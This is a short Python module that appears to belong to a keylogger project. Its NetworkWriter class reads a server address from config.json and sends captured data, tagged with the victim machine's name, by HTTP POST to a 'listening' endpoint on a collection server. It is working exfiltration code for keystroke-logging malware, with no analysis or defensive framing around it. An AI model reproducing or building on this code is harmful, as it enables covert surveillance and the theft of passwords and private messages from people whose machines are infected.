import requests
from Ikeylogger import IWriter
import json

class NetworkWriter(IWriter):
    def __init__(self):
        try:
            with open("config.json", "r") as file:
                config = json.load(file)
                server_ip = config.get("server_ip", "localhost")
                self.server_url = f"http://{server_ip}:5001/api"
        except (FileNotFoundError, json.JSONDecodeError):
            self.server_url = "http://localhost:5001/api"

    def send_data(self, data: str, machine_name: str) -> None:
        try:
            response = requests.post(
                f"{self.server_url}/listening/{machine_name}",
                json=data,
                headers={"Content-Type": "application/json"}
            )
            print(f"Server response: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Error sending data to server: {e}")

networkWriter = NetworkWriter()
